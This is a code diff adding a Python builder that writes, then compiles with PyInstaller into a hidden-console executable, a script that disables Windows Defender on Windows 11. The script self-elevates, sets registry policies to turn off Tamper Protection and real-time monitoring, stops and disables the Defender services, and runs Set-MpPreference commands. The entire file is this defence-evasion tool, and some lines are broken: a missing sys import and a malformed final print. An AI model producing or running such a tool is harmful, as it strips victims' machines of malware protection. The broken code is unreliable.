@@ -1,0 +1,114 @@
+import os
+import subprocess
+import sys
+
+def install_pyinstaller():
+    try:
+        import PyInstaller
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+
+def create_win11_defender_disable():
+    win11_code = '''import os
+import subprocess
+import time
+import ctypes
+
+def run_as_admin():
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            return True
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        return False
+    except:
+        return False
+
+if not run_as_admin():
+    sys.exit()
+
+time.sleep(1)
+
+def disable_win11_defender():
+    # 1. Сначала отключаем Tamper Protection через реестр
+    tamper_commands = [
+        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',
+        
+        # Для Windows 11 нужны дополнительные ключи
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Security Center" /v "DisableVirusUI" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center" /v "DisableVirusUI" /t REG_DWORD /d 1 /f'
+    ]
+    
+    # 2. Основные политики отключения
+    policy_commands = [
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting" /v "DisableGenericReports" /t REG_DWORD /d 1 /f'
+    ]
+    
+    # 3. Службы Windows 11
+    service_commands = [
+        'net stop WinDefend',
+        'sc config WinDefend start= disabled',
+        'net stop WdNisSvc',
+        'sc config WdNisSvc start= disabled', 
+        'net stop SecurityHealthService',
+        'sc config SecurityHealthService start= disabled',
+        'net stop WdNisDrv',
+        'sc config WdNisDrv start= disabled'
+    ]
+    
+    # 4. PowerShell команды для Windows 11
+    ps_commands = [
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Set-MpPreference -DisableBehaviorMonitoring $true", 
+        "Set-MpPreference -DisableBlockAtFirstSeen $true",
+        "Set-MpPreference -DisableIOAVProtection $true",
+        "Set-MpPreference -DisablePrivacyMode $true",
+        "Set-MpPreference -PUAProtection disable",
+        "Set-MpPreference -MAPSReporting 0"
+    ]
+    
+    # Выполняем все команды
+    print("Disabling Tamper Protection...")
+    for cmd in tamper_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.3)
+    
+    print("Applying policies...")
+    for cmd in policy_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.3)
+    
+    print("Stopping services...")
+    for cmd in service_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.3)
+    
+    print("Running PowerShell commands...")
+    for cmd in ps_commands:
+        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+        time.sleep(0.3)
+    
+    # Обновляем политики
+    subprocess.run("gpupdate /force", shell=True)
+    print(11 Defender disabled successfully")
+
+disable_win11_defender()
+'''
+
+    with open('win11_defender_disable.py', 'w', encoding='utf-8') as f:
+        f.write(win11_code)
+
+def compile_to_exe():
+    os.system('pyinstaller --onefile --noconsole --name "Win11DefenderDisable" win11_defender_disable.py')
+    print("EXE создан: Win11DefenderDisable.exe")
+
+if __name__ == "__main__":
+    install_pyinstaller()
+    create_win11_defender_disable()
+    compile_to_exe()
